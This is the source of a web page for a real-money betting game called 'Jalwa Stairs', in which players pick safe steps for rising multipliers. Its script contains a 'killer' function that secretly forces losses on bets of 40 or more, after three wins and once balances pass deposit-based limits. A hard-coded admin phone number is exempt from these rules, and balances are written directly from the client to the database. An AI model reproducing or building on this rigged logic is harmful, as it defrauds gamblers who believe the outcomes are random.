<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Jalwa Stairs - Premium Pro</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    
    <style>
        :root { 
            --bg: #020617; 
            --card-bg: #0f172a;
            --cyan: #00f2ff; 
            --gold: #fbbf24; 
            --green: #22c55e; 
            --red: #ef4444; 
            --border: rgba(255, 255, 255, 0.1);
        }

        * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        
        body { 
            background: radial-gradient(circle at top, #1e293b 0%, var(--bg) 100%); 
            margin: 0; 
            height: 100vh; 
            overflow: hidden; 
            color: white; 
            display: flex; 
            flex-direction: column; 
        }

        .header { 
            padding: 15px 20px; 
            background: rgba(0,0,0,0.4); 
            backdrop-filter: blur(10px);
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            border-bottom: 1px solid var(--border);
            z-index: 100; 
        }
        .brand { font-family: 'Orbitron'; font-size: 16px; color: var(--cyan); letter-spacing: 1px; }
        .bal-box { 
            background: rgba(251, 191, 36, 0.1); 
            border: 1px solid var(--gold); 
            padding: 5px 15px; 
            border-radius: 50px; 
            color: var(--gold);
            font-weight: 900;
            font-size: 14px;
        }
        .back-btn { color: #94a3b8; text-decoration: none; font-size: 20px; }

        .game-container { 
            flex: 1; 
            width: 100%; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            padding-top: 20px; 
            overflow-y: auto;
            padding-bottom: 250px; 
        }
        
        #status { 
            font-family: 'Orbitron';
            font-size: 10px; 
            margin-bottom: 20px; 
            color: var(--cyan); 
            text-align: center;
            background: rgba(0,242,255,0.05);
            padding: 5px 15px;
            border-radius: 20px;
        }

        .game-board { 
            display: flex; 
            flex-direction: column-reverse; 
            gap: 10px; 
            width: 90%; 
            max-width: 320px; 
        }

        .row { 
            display: flex; 
            gap: 10px; 
            opacity: 0.2; 
            transition: 0.4s; 
            padding: 8px; 
            border-radius: 12px; 
            background: rgba(255,255,255,0.02);
            border: 1px solid transparent;
        }
        
        .row.active { 
            opacity: 1; 
            background: rgba(0, 242, 255, 0.05); 
            border-color: rgba(0, 242, 255, 0.3);
            box-shadow: 0 0 20px rgba(0, 242, 255, 0.1);
        }

        .step { 
            flex: 1; 
            height: 45px; 
            background: #1e293b; 
            border: 1px solid #334155; 
            border-radius: 10px; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 20px; 
            color: #475569; 
            transition: 0.2s;
        }

        .step.win { background: var(--green); color: white; border: none; box-shadow: 0 0 15px var(--green); }
        .step.lose { background: var(--red); color: white; border: none; box-shadow: 0 0 15px var(--red); }
        
        .mult-tag { 
            width: 45px; 
            font-family: 'Orbitron'; 
            font-size: 11px; 
            color: var(--gold); 
            display: flex; 
            align-items: center; 
            justify-content: center;
        }

        .controls { 
            position: fixed; 
            bottom: 0; 
            width: 100%; 
            max-width: 480px; 
            background: rgba(15, 23, 42, 0.95); 
            backdrop-filter: blur(15px); 
            padding: 20px; 
            border-top: 1px solid var(--border); 
            border-radius: 25px 25px 0 0; 
            display: flex; 
            flex-direction: column; 
            gap: 12px; 
            box-sizing: border-box; 
            z-index: 1000;
        }

        .bet-input { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #334155; 
            border-radius: 12px; 
            font-family: 'Orbitron'; 
            font-size: 18px; 
            background: #020617; 
            color: var(--cyan); 
            text-align: center;
            outline: none; 
        }

        .btn-main { 
            width: 100%; 
            padding: 15px; 
            border: none; 
            border-radius: 12px; 
            font-weight: 900;
            font-size: 16px; 
            cursor: pointer; 
            text-transform: uppercase;
            transition: 0.2s; 
        }

        .start { background: var(--cyan); color: #000; }
        .cashout { background: var(--green); color: white; display: none; }
        .revive { background: var(--gold); color: #000; display: none; }
    </style>
</head>
<body>

<div class="header">
    <a href="index.html" class="back-btn"><i class="fas fa-circle-chevron-left"></i></a>
    <div class="brand">STAIRS PRO</div>
    <div class="bal-box">â‚¹<span id="balVal">0.00</span></div>
</div>

<div class="game-container">
    <div id="status">SYNCING SERVER...</div>
    <div class="game-board" id="board"></div>
</div>

<div class="controls">
    <input type="number" id="betAmt" class="bet-input" value="10">
    <button class="btn-main start" id="startBtn" onclick="startGame()">START MISSION</button>
    <button class="btn-main cashout" id="cashBtn" onclick="cashOut()">CASHOUT</button>
    <button class="btn-main revive" id="reviveBtn" onclick="reviveGame()">REVIVE (TAXED)</button>
</div>

<script>
    // --- DATABASE CONFIG ---
    const firebaseConfig = { databaseURL: "https://jalwa-v2-ad222-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    let userPhone = localStorage.getItem('jalwa_user_phone');
    let userBalance = 0, betAmt = 0, currentLevel = 0, gameActive = false, livesUsed = 0;
    let totalDeposit = 0, consecutiveWins = parseInt(localStorage.getItem('stairsWins') || "0");
    let multipliers = [1.5, 3.5, 8, 15, 30, 70, 150, 400];
    let currentPeriod = "", safePath = [];

    // --- ðŸš¨ SUPREME KILLER LOGIC ---
    async function getKillerDecision() {
        // ðŸ”¥ ADMIN BYPASS
        if (userPhone === "8955564222") return "admin";

        // Logic 1: Bonus User â‚¹400 Limit
        if (totalDeposit < 100 && userBalance > 380) return "kill";

        // Logic 2: High Bet â‚¹40+ KILL
        if (betAmt >= 40) return "kill";

        // Logic 3: Recharge User Profit Limit (1.5x)
        if (totalDeposit >= 500 && userBalance >= (totalDeposit * 1.5)) return "kill";

        // Logic 4: Win Streak Control
        if (consecutiveWins >= 3) return "kill";

        return "normal";
    }

    function updatePeriod() {
        const now = new Date();
        const pId = now.getFullYear() + "" + (now.getMonth()+1).toString().padStart(2,'0') + now.getDate().toString().padStart(2,'0') + now.getHours().toString().padStart(2,'0') + now.getMinutes().toString().padStart(2,'0');
        if(currentPeriod !== pId) {
            currentPeriod = pId;
            db.ref('global_stairs/' + currentPeriod).on('value', snap => {
                if(snap.exists()) safePath = snap.val().path;
                else {
                    let path = [];
                    for(let i=0; i<8; i++) path.push(Math.floor(Math.random() * 2));
                    db.ref('global_stairs/' + pId).set({ path: path });
                }
            });
        }
        let sec = 60 - now.getSeconds();
        if(!gameActive && currentLevel === 0) document.getElementById('status').innerText = `NEXT ROUND IN: ${sec}s`;
    }
    setInterval(updatePeriod, 1000);

    db.ref('users/' + userPhone).on('value', snap => {
        const d = snap.val() || {};
        userBalance = d.balance || 0;
        totalDeposit = d.totalDeposit || 0;
        document.getElementById('balVal').innerText = Number(userBalance).toFixed(2);
    });

    function createBoard() {
        const board = document.getElementById('board'); board.innerHTML = '';
        multipliers.forEach((m, i) => {
            const row = document.createElement('div');
            row.className = 'row'; row.id = `row-${i}`;
            row.innerHTML = `<div class="mult-tag">${m}x</div><div class="step" onclick="makeMove(${i}, 0)"><i class="fas fa-question"></i></div><div class="step" onclick="makeMove(${i}, 1)"><i class="fas fa-question"></i></div>`;
            board.appendChild(row);
        });
    }

    async function startGame() {
        betAmt = parseFloat(document.getElementById('betAmt').value);
        if(userBalance < betAmt || betAmt <= 0) return alert("Insufficient Balance");
        await db.ref('users/' + userPhone).update({ balance: userBalance - betAmt });
        gameActive = true; currentLevel = 0; livesUsed = 0; createBoard();
        document.getElementById('row-0').classList.add('active');
        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('cashBtn').style.display = 'block';
    }

    async function makeMove(rowIdx, stepIdx) {
        if(!gameActive || rowIdx !== currentLevel) return;
        const steps = document.getElementById(`row-${rowIdx}`).querySelectorAll('.step');
        
        const decision = await getKillerDecision();
        let isSafe = (stepIdx === safePath[rowIdx]);

        // ðŸš¨ KILLER TRIGGER
        if (decision === "kill" && currentLevel >= 1) isSafe = false;

        if(isSafe) {
            steps[stepIdx].classList.add('win'); steps[stepIdx].innerHTML = '<i class="fas fa-bolt"></i>';
            currentLevel++;
            document.getElementById('cashBtn').innerText = `CASHOUT â‚¹${(betAmt * multipliers[currentLevel-1]).toFixed(0)}`;
            if(currentLevel < 8) document.getElementById(`row-${currentLevel}`).classList.add('active');
            else cashOut();
        } else {
            steps[stepIdx].classList.add('lose'); steps[stepIdx].innerHTML = '<i class="fas fa-bomb"></i>';
            gameActive = false;
            if(livesUsed < 1 && currentLevel > 0) {
                document.getElementById('reviveBtn').style.display = 'block';
                document.getElementById('cashBtn').style.display = 'none';
            } else {
                consecutiveWins = 0; localStorage.setItem('stairsWins', "0");
                setTimeout(endGame, 1500);
            }
        }
    }

    function reviveGame() {
        betAmt = betAmt / 2; livesUsed++; gameActive = true;
        document.getElementById('reviveBtn').style.display = 'none';
        document.getElementById('cashBtn').style.display = 'block';
        const steps = document.getElementById(`row-${currentLevel}`).querySelectorAll('.step');
        steps.forEach(s => { s.classList.remove('lose'); s.innerHTML = '<i class="fas fa-question"></i>'; });
    }

    async function cashOut() {
        let winAmt = betAmt * multipliers[currentLevel-1];
        await db.ref('users/' + userPhone).update({ balance: userBalance + winAmt });
        consecutiveWins++; localStorage.setItem('stairsWins', consecutiveWins.toString());
        confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
        setTimeout(endGame, 2000);
    }

    function endGame() {
        gameActive = false; currentLevel = 0;
        document.getElementById('startBtn').style.display = 'block';
        document.getElementById('cashBtn').style.display = 'none';
        document.getElementById('reviveBtn').style.display = 'none';
        document.getElementById('cashBtn').innerText = "CASHOUT";
    }

    createBoard();
    updatePeriod();
</script>
</body>
</html>
